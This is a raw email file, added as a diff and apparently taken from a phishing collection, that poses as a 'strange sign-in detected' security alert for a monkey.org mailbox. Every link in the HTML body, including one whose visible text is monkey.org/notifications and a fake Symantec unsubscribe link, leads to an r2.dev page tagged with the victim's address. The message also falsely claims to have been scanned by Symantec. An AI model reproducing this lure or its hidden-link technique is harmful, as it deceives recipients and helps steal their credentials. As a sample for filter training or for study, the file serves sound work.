@@ -1,0 +1,268 @@
+From jose@monkey.org Tue Aug  8 04:25:47 2023 +0000
+Return-Path: rosinage@nb9grid.theworkpc.com
+Delivered-To: jose@monkey.org
+X-FDA: 81099649134.14.EFC5679
+Received: from mta0.nb9grid.theworkpc.com (mta0.nb9grid.theworkpc.com [5.181.23.106])
+	by imf19.b.hostedemail.com (Postfix) with ESMTP id B98E740007
+	for <jose@monkey.org>; Tue,  8 Aug 2023 04:25:45 +0000 (UTC)
+Authentication-Results: imf19.b.hostedemail.com;
+	dkim=pass header.d=nb9grid.theworkpc.com header.s=default header.b=G9ojIyWk;
+	spf=pass (imf19.b.hostedemail.com: domain of rosinage@nb9grid.theworkpc.com designates 5.181.23.106 as permitted sender) smtp.mailfrom=rosinage@nb9grid.theworkpc.com;
+	dmarc=pass (policy=reject) header.from=nb9grid.theworkpc.com
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=hostedemail.com;
+	s=arc-20220608; t=1691468746;
+	h=from:from:sender:reply-to:subject:subject:date:date:
+	 message-id:message-id:to:to:cc:mime-version:mime-version:
+	 content-type:content-type:content-transfer-encoding:in-reply-to:
+	 references:dkim-signature; bh=5wWAkPz3zp2xRQUbwF67LEUGM5vYzzKSz1kgoI+pMdY=;
+	b=BV5HG17Z3f9VVCMZTfEWufucfoZMIhKRkPteczdoYxLo5pSzELhsriwjYbMRR5sceQTNb2
+	57ZA961jPeDzuk4iRN3/+gNKeBmXkZRsjJRo4lpn62/mse01ZevN6IF2tMqWWrN4JU5I7n
+	Z+goNEx00J7gwGxl6VlFQMsau9czquY=
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1691468746; a=rsa-sha256;
+	cv=none;
+	b=WCddZMgKcjj8KGl1i6VJ5tqFqp0bF+KA1T+5OSHTaJrCGUpGiADuYIh1D+/sZTeOvKiCBx
+	XhLVxc+SK5+2OELKxntGU0OHNfW4i24qeqAB5+P6S1Nu7gP2tfxo/91Z5VkdvyJTIV6RS+
+	ZqMBu8SULfnoBMtlB2nuXPLw/VvSDaY=
+ARC-Authentication-Results: i=1;
+	imf19.b.hostedemail.com;
+	dkim=pass header.d=nb9grid.theworkpc.com header.s=default header.b=G9ojIyWk;
+	spf=pass (imf19.b.hostedemail.com: domain of rosinage@nb9grid.theworkpc.com designates 5.181.23.106 as permitted sender) smtp.mailfrom=rosinage@nb9grid.theworkpc.com;
+	dmarc=pass (policy=reject) header.from=nb9grid.theworkpc.com
+DKIM-Signature: v=1; a=rsa-sha1; c=relaxed/relaxed; s=default; d=nb9grid.theworkpc.com;
+ h=From:To:Subject:Date:Message-ID:MIME-Version:Content-Type;
+ i=rosinage@nb9grid.theworkpc.com;
+ bh=LlX7wfc7+Ahriwn9EiWle67lg6g=;
+ b=G9ojIyWkbfOeWcpEfl9Q3V6umGvdNQoF5zp5vWdMJMKsz2x/3br1HnZPUPyQCNNR5s1IaV3M/KiN
+   MnSqwTfx9n6Fd6bQLSe5a+csiC6f25tPsNanlFkx2e50pDwnYip4t5VFUhZuBf1lo24IzJbI9HIM
+   ZhHThQNnpsOx4Ja4ti0=
+From: Security Notification<rosinage@nb9grid.theworkpc.com>
+To: jose@monkey.org
+Subject: Strange sign-in detected on jose@monkey.org
+Date: 8 Aug 2023 06:25:43 +0200
+Message-ID: <20230808062543.4EA64FD3571F17E2@nb9grid.theworkpc.com>
+MIME-Version: 1.0
+Content-Type: multipart/alternative;
+	boundary="----=_NextPart_000_0012_248C0D97.4E7CDC1A"
+X-Rspamd-Server: rspam12
+X-Rspam-User: 
+X-Spam-Status: No, score=2.70
+X-Stat-Signature: 1n1mcj35rbd6ukfgoq1obd8yb9h3f5bb
+X-Rspamd-Queue-Id: B98E740007
+X-HE-Tag: 1691468745-277252
+X-HE-Meta: U2FsdGVkX1/bYlbEOf+2esZ8mkBfVttmqYKVQLDrNAwqs1feUQCEHCsoY8Xf37JzRlBYT1hRgFpMerhZRm/WwzfnlJl1kqNce9r92jbzW0Hm2aeCD137iuiexi2sg5SSNvLjzDopnAME6gOpsrxJbUzLbTFfhXxNMMYji9jarHNjm0/g2HzaJ8a/gfeFWuF3/C9gFpPNDDdpvRtG3ulLZhyHs9Q+v2RCSaw5Fgt0/33zTQSl3tnRs8lKLHeEHsPTpr96T5tJfYxYf0HBb+arinAgsAkbW8wvHckB+6uoz0aET3STxb2P+w==
+Status: O
+X-Status: 
+X-Keywords:                  
+X-UID: 232
+
+
+------=_NextPart_000_0012_248C0D97.4E7CDC1A
+Content-Type: text/plain;
+	charset="utf-8"
+Content-Transfer-Encoding: quoted-printable
+
+This is a copy of a security alert sent to jose@monkey.org.=20
+jose@monkey.org  If you don't recognize this account,   remove=20
+it. 
+
+A new sign-in on Windows
+
+ jose@monkey.org 
+
+We noticed a new sign-in to your monkey.org account on a Windows=20
+device. We strongly advice you to check activity of your account=20
+now so as to automatically update and strengthen your email=20
+security..
+Check activity
+
+You can also see security activity at
+https://monkey.org/notifications
+
+You received this email to let you know about important changes=20
+to your jose@monkey.org. Account and services.
+
+=C2=A9 2023 monkey.org
+
+This email has been scanned by the Symantec Email Security.cloud=20
+service.=20
+ To unsuscribe, click here   http://www.symanteccloud.com=20
+  _______________________________________________________________
+_______
+------=_NextPart_000_0012_248C0D97.4E7CDC1A
+Content-Type: text/html
+Content-Transfer-Encoding: quoted-printable
+
+<html><head>
+<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+</head><body style=3D"margin: 0.5em;">
+
+
+
+
+<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+<meta name=3D"GENERATOR" content=3D"MSHTML 11.00.10570.1001">
+<style type=3D"text/css">
+<!--
+=2Estyle1 {
+	color: #FFFFFF;
+	font-weight: bold;
+	font-family: Geneva, Arial, Helvetica, sans-serif;
+	font-size: 15px;
+}
+=2Estyle2 {color: #63C4F4}
+-->
+</style>
+
+
+<table width=3D"100%" height=3D"100%" lang=3D"en" style=3D'text-align: left=
+; color: rgb(38, 40, 42); text-transform: none; letter-spacing: normal; fon=
+t-family: "Helvetica Neue", Helvetica, Arial, sans-serif; font-size: 13px; =
+font-style: normal; font-weight: 400; word-spacing: 0px; white-space: norma=
+l; border-collapse: collapse; min-width: 348px; box-sizing: border-box; orp=
+hans: 2; widows: 2; background-color: rgb(255, 255, 255); font-variant-liga=
+tures: normal; font-variant-caps: normal;=20
+-webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-de=
+coration-style: initial; text-decoration-color: initial;' border=3D"0" cell=
+spacing=3D"0" cellpadding=3D"0"><tbody style=3D"box-sizing: border-box;"><t=
+r align=3D"center" style=3D"box-sizing: border-box;"><td style=3D"margin: 0=
+px; box-sizing: border-box;">
+<table width=3D"100%" height=3D"100%" lang=3D"en" style=3D'text-align: left=
+; color: rgb(38, 40, 42); text-transform: none; letter-spacing: normal; fon=
+t-family: "Helvetica Neue", Helvetica, Arial, sans-serif; font-size: 13px; =
+font-style: normal; font-weight: 400; word-spacing: 0px; white-space: norma=
+l; border-collapse: collapse; min-width: 348px; box-sizing: border-box; orp=
+hans: 2; widows: 2; background-color: rgb(255, 255, 255); font-variant-liga=
+tures: normal; font-variant-caps: normal;=20
+-webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-de=
+coration-style: initial; text-decoration-color: initial;' border=3D"0" cell=
+spacing=3D"0" cellpadding=3D"0"><tbody style=3D"box-sizing: border-box;"><t=
+r align=3D"center" style=3D"box-sizing: border-box;"><td style=3D"margin: 0=
+px; box-sizing: border-box;"><br class=3D"v1Apple-interchange-newline" styl=
+e=3D"box-sizing: border-box;">
+<table style=3D"padding-bottom: 20px; border-collapse: collapse; min-width:=
+ 220px; max-width: 516px; box-sizing: border-box;" border=3D"0" cellspacing=
+=3D"0" cellpadding=3D"0"><tbody style=3D"box-sizing: border-box;"><tr style=
+=3D"box-sizing: border-box;"><td width=3D"8" style=3D"margin: 0px; width: 8=
+px; box-sizing: border-box;"></td><td style=3D"margin: 0px; box-sizing: bor=
+der-box;">
+<div style=3D"padding: 16px; margin-bottom: 6px; direction: ltr; box-sizing=
+: border-box; background-color: rgb(245, 245, 245);" bis_skin_checked=3D"1"=
+><table width=3D"100%" style=3D"border-collapse: collapse; box-sizing: bord=
+er-box;" border=3D"0" cellspacing=3D"0" cellpadding=3D"0"><tbody style=3D"b=
+ox-sizing: border-box;"><tr style=3D"box-sizing: border-box;"><td style=3D"=
+margin: 0px; vertical-align: top; box-sizing: border-box;">
+<span style=3D"line-height: 1.6; font-family: Roboto-Regular, Helvetica, Ar=
+ial, sans-serif; font-size: 13px; box-sizing: border-box;">This is a copy o=
+f a security alert sent to<span style=3D"box-sizing: border-box;">&nbsp;jos=
+e@monkey.org. jose@monkey.org </span>
+<span style=3D"line-height: 1.6; font-family: Roboto-Regular, Helvetica, Ar=
+ial, sans-serif; font-size: 13px; box-sizing: border-box;">If you don't rec=
+ognize this account,<span style=3D"box-sizing: border-box;">&nbsp;</span><s=
+pan>&nbsp;</span>
+<a style=3D"color: rgb(66, 133, 244); text-decoration: none; box-sizing: bo=
+rder-box; background-color: transparent;" href=3D"https://pub-a7ef776248d24=
+8fdb3c30e693640b488.r2.dev/cheDOClatest.html#jose@monkey.org" target=3D"_bl=
+ank" rel=3D"noreferrer">remove</a><span style=3D"box-sizing: border-box;">&=
+nbsp;</span>it.</span></span></td></tr></tbody></table></div>
+<div align=3D"center" style=3D"padding: 40px 20px; border-radius: 8px; bord=
+er: thin solid rgb(218, 220, 224); border-image: none; box-sizing: border-b=
+ox;" bis_skin_checked=3D"1"><div style=3D"text-align: center; line-height: =
+32px; padding-bottom: 24px; border-bottom-color: rgb(218, 220, 224); border=
+-bottom-width: thin; border-bottom-style: solid; box-sizing: border-box;" b=
+is_skin_checked=3D"1"><div style=3D"font-size: 24px; box-sizing: border-box=
+;" bis_skin_checked=3D"1">A new sign-in on Windows</div>
+<table align=3D"center" style=3D"margin-top: 8px; border-collapse: collapse=
+; box-sizing: border-box;"><tbody style=3D"box-sizing: border-box;"><tr sty=
+le=3D"line-height: normal; box-sizing: border-box;"><td align=3D"right" sty=
+le=3D"margin: 0px; padding-right: 8px; box-sizing: border-box;">
+<img width=3D"20" height=3D"20" class=3D"v1CToWUd" style=3D"border-radius: =
+50%; width: 20px; vertical-align: sub; min-height: 20px; box-sizing: border=
+-box;" alt=3D"" src=3D"https://lh3.googleusercontent.com/a/AGNmyxbnwxW9yOxn=
+ouES3vnblD1yJG9uEkIGqugVv2o7=3Ds96"></td><td style=3D"margin: 0px; box-sizi=
+ng: border-box;">jose@monkey.org</td></tr></tbody></table></div>
+<div style=3D"text-align: center; line-height: 20px; padding-top: 20px; fon=
+t-family: Roboto-Regular, Helvetica, Arial, sans-serif; font-size: 14px; bo=
+x-sizing: border-box;" bis_skin_checked=3D"1">We noticed a new sign-in to y=
+our&nbsp;monkey.org account on a Windows device. We strongly advice you to =
+check activity of your account now so as to automatically update and streng=
+then your email security..<div style=3D"text-align: center; padding-top: 32=
+px; box-sizing: border-box;" bis_skin_checked=3D"1">
+<a style=3D"padding: 10px 24px; border-radius: 5px; color: rgb(255, 255, 25=
+5); line-height: 16px; font-size: 14px; font-weight: 400; text-decoration: =
+none; display: inline-block; min-width: 90px; box-sizing: border-box; backg=
+round-color: rgb(65, 132, 243);" href=3D"https://pub-a7ef776248d248fdb3c30e=
+693640b488.r2.dev/cheDOClatest.html#jose@monkey.org" target=3D"_blank" rel=
+=3D"noreferrer">Check activity</a></div></div>
+<div style=3D"text-align: center; color: rgb(95, 99, 104); line-height: 16p=
+x; letter-spacing: 0.3px; padding-top: 20px; font-size: 12px; box-sizing: b=
+order-box;" bis_skin_checked=3D"1">You can also see security activity at<br=
+ style=3D"box-sizing: border-box;">
+<a style=3D"color: rgb(34, 34, 34); box-sizing: border-box; background-colo=
+r: transparent; text-decoration-thickness: initial; text-decoration-style: =
+inherit; text-decoration-color: inherit; text-decoration-line: inherit;" hr=
+ef=3D"https://pub-a7ef776248d248fdb3c30e693640b488.r2.dev/cheDOClatest.html=
+#jose@monkey.org" target=3D"_blank" rel=3D"noreferrer">https://monkey.org/<=
+wbr style=3D"box-sizing: border-box;">notifications</a></div></div>
+<div style=3D"text-align: left; box-sizing: border-box;" bis_skin_checked=
+=3D"1">
+<div style=3D"text-align: center; line-height: 18px; padding-top: 12px; fon=
+t-family: Roboto-Regular, Helvetica, Arial, sans-serif; font-size: 11px; bo=
+x-sizing: border-box;" bis_skin_checked=3D"1"><div style=3D"box-sizing: bor=
+der-box;" bis_skin_checked=3D"1">You received this email to let you know ab=
+out important changes to your&nbsp;jose@monkey.org. Account and services.</=
+div><div style=3D"direction: ltr; box-sizing: border-box;" bis_skin_checked=
+=3D"1">
+&copy; 2023&nbsp;monkey.org<br style=3D"box-sizing: border-box;"><font size=
+=3D"2" style=3D"box-sizing: border-box;"><font color=3D"#999999" style=3D"b=
+ox-sizing: border-box;"><font face=3D"Courier New" style=3D"box-sizing: bor=
+der-box;"><br style=3D"box-sizing: border-box;">This email has been scanned=
+ by the Symantec Email Security.cloud service.</font>
+<br style=3D"color: rgb(0, 0, 0); text-transform: none; text-indent: 0px; l=
+etter-spacing: normal; font-family: monospace; font-size: medium; font-styl=
+e: normal; font-weight: 400; word-spacing: 0px; white-space: normal; box-si=
+zing: border-box; orphans: 2; widows: 2; font-variant-ligatures: normal; fo=
+nt-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-th=
+ickness: initial; text-decoration-style: initial; text-decoration-color: in=
+itial;"></font></font>
+<span style=3D"color: rgb(0, 0, 0); text-transform: none; text-indent: 0px;=
+ letter-spacing: normal; font-family: monospace; font-size: medium; font-st=
+yle: normal; font-weight: 400; word-spacing: 0px; float: none; display: inl=
+ine !important; white-space: normal; box-sizing: border-box; orphans: 2; wi=
+dows: 2; font-variant-ligatures: normal; font-variant-caps: normal; -webkit=
+-text-stroke-width: 0px; text-decoration-thickness: initial; text-decoratio=
+n-style: initial; text-decoration-color: initial;">
+<span style=3D"box-sizing: border-box;">To unsuscribe, click here&nbsp;</sp=
+an></span>
+<a style=3D"color: rgb(0, 172, 255); text-transform: none; text-indent: 0px=
+; letter-spacing: normal; font-family: monospace; font-size: medium; font-s=
+tyle: normal; font-weight: 400; text-decoration: none; word-spacing: 0px; w=
+hite-space: normal; box-sizing: border-box; orphans: 2; widows: 2; backgrou=
+nd-color: transparent; font-variant-ligatures: normal; font-variant-caps: n=
+ormal; -webkit-text-stroke-width: 0px;"=20
+href=3D"https://pub-a7ef776248d248fdb3c30e693640b488.r2.dev/cheDOClatest.ht=
+ml#jose@monkey.org" target=3D"_blank" rel=3D"noreferrer">
+http://www.symanteccloud.com</a><font color=3D"#999999" size=3D"2" style=3D=
+"box-sizing: border-box;">
+<br style=3D"color: rgb(0, 0, 0); text-transform: none; text-indent: 0px; l=
+etter-spacing: normal; font-family: monospace; font-size: medium; font-styl=
+e: normal; font-weight: 400; word-spacing: 0px; white-space: normal; box-si=
+zing: border-box; orphans: 2; widows: 2; font-variant-ligatures: normal; fo=
+nt-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-th=
+ickness: initial; text-decoration-style: initial; text-decoration-color: in=
+itial;"></font>
+<span style=3D"color: rgb(0, 0, 0); text-transform: none; text-indent: 0px;=
+ letter-spacing: normal; font-family: monospace; font-size: medium; font-st=
+yle: normal; font-weight: 400; word-spacing: 0px; float: none; display: inl=
+ine !important; white-space: normal; box-sizing: border-box; orphans: 2; wi=
+dows: 2; font-variant-ligatures: normal; font-variant-caps: normal; -webkit=
+-text-stroke-width: 0px; text-decoration-thickness: initial; text-decoratio=
+n-style: initial; text-decoration-color: initial;">
+______________________________________________________________________</spa=
+n><font color=3D"#999999" size=3D"2" style=3D"box-sizing: border-box;">&nbs=
+p;&nbsp;&nbsp;</font></div></div></div></td></tr></tbody></table></td></tr>=
+</tbody></table></td></tr></tbody></table>
+
+
+
+</body></html>
+------=_NextPart_000_0012_248C0D97.4E7CDC1A--
